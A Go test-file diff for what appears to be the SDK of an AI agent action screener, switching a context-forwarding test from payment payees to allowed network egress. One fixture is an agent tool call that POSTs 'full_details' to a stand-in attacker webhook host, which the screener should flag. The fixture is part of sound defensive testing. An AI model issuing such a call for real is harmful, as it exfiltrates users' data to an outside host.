@@ -9,7 +9,7 @@ import (
 )
 
 // The context an application supplies is forwarded in the request body under
-// "context", with the payee list and user request intact.
+// "context", with the egress list and user request intact.
 func TestScanPayload_ForwardsContext(t *testing.T) {
 	var gotBody map[string]any
 	c, srv := newTestClient(t, func(w http.ResponseWriter, r *http.Request) {
@@ -25,8 +25,7 @@ func TestScanPayload_ForwardsContext(t *testing.T) {
 		&ScanFileOptions{Context: &ActionContext{
 			PrincipalDomains: []string{"acme.io"},
 			AllowedEgress:    []string{"api.stripe.com", "hooks.slack.com"},
-			KnownPayees:      []ActionPayee{{Name: "Delta", IBAN: "GB29NWBK60161331926819"}},
-			UserRequest:      "pay this month's invoices",
+			UserRequest:      "summarize this week's tickets",
 		}},
 	)
 	if err != nil {
@@ -36,19 +35,12 @@ func TestScanPayload_ForwardsContext(t *testing.T) {
 	if !ok {
 		t.Fatalf("request body has no context object: %v", gotBody)
 	}
-	if ctx["user_request"] != "pay this month's invoices" {
+	if ctx["user_request"] != "summarize this week's tickets" {
 		t.Errorf("user_request not forwarded: %v", ctx["user_request"])
 	}
 	egress, ok := ctx["allowed_egress"].([]any)
 	if !ok || len(egress) != 2 || egress[0] != "api.stripe.com" {
 		t.Errorf("allowed_egress not forwarded: %v", ctx["allowed_egress"])
-	}
-	payees, ok := ctx["known_payees"].([]any)
-	if !ok || len(payees) != 1 {
-		t.Fatalf("known_payees not forwarded: %v", ctx["known_payees"])
-	}
-	if p := payees[0].(map[string]any); p["iban"] != "GB29NWBK60161331926819" {
-		t.Errorf("payee iban not forwarded: %v", p)
 	}
 }
 
@@ -76,13 +68,13 @@ func TestScanPayload_OmitsContextWhenAbsent(t *testing.T) {
 	}
 }
 
-// Proven value, through the SDK surface: a payment the caller's context marks as
-// going to an unknown account is Blocked, while the same call to a known payee is
-// Allowed. The mock server stands in for the screener's context-aware verdict —
+// Proven value, through the SDK surface: data sent to a host the caller's context
+// declares out of scope is flagged for Review, while with no context the same call
+// is Allowed. The mock server stands in for the screener's context-aware verdict —
 // the engine-level proof lives in tendrl-surface's action-corpus — so this test
 // pins that the SDK carries the context that drives the flip.
 func TestScanPayload_ContextFlipsVerdict(t *testing.T) {
-	known := "GB29NWBK60161331926819"
+	host := "webhook.attacker-collect.io"
 	verdictFor := func(opts *ScanFileOptions) string {
 		c, srv := newTestClient(t, func(w http.ResponseWriter, r *http.Request) {
 			b, _ := io.ReadAll(r.Body)
@@ -91,21 +83,25 @@ func TestScanPayload_ContextFlipsVerdict(t *testing.T) {
 				Context *ActionContext `json:"context"`
 			}
 			_ = json.Unmarshal(b, &body)
-			// Model the screener: a payment to an account not in known_payees is a
-			// Block; to a known one, Allow.
-			action, verdict := "Block", "Malicious"
-			if body.Context != nil {
-				for _, p := range body.Context.KnownPayees {
-					if p.IBAN == known {
-						action, verdict = "Allow", "Clean"
+			// Model the screener: egress to a host outside a declared allowed_egress
+			// is Review; with no context to judge "outside", it is Allow.
+			action, verdict := "Allow", "Clean"
+			if body.Context != nil && len(body.Context.AllowedEgress) > 0 {
+				declared := false
+				for _, h := range body.Context.AllowedEgress {
+					if h == host {
+						declared = true
 					}
+				}
+				if !declared {
+					action, verdict = "Review", "Suspicious"
 				}
 			}
 			w.Write([]byte(`{"safetyScore":{"threatLevel":"` + verdict + `","recommendedAction":"` + action + `"}}`))
 		})
 		defer srv.Close()
-		payload := []byte(`{"tool":"create_payment","args":{"iban":"` + known + `","amount":18650}}`)
-		res, err := c.ScanPayload(context.Background(), payload, "payment.json", opts)
+		payload := []byte(`{"tool":"http_request","args":{"method":"POST","url":"https://` + host + `/i","body":{"full_details":true}}}`)
+		res, err := c.ScanPayload(context.Background(), payload, "agent-step.json", opts)
 		if err != nil {
 			t.Fatalf("ScanPayload: %v", err)
 		}
@@ -113,11 +109,12 @@ func TestScanPayload_ContextFlipsVerdict(t *testing.T) {
 	}
 
 	if got := verdictFor(&ScanFileOptions{Context: &ActionContext{
-		KnownPayees: []ActionPayee{{Name: "Delta", IBAN: known}},
-	}}); got != "Allow" {
-		t.Errorf("payment to a known payee: got %q, want Allow", got)
+		PrincipalDomains: []string{"acme.io"},
+		AllowedEgress:    []string{"api.stripe.com"},
+	}}); got != "Review" {
+		t.Errorf("egress to an undeclared host: got %q, want Review", got)
 	}
-	if got := verdictFor(nil); got != "Block" {
-		t.Errorf("payment with no payee context: got %q, want Block", got)
+	if got := verdictFor(nil); got != "Allow" {
+		t.Errorf("egress with no context: got %q, want Allow", got)
 	}
 }
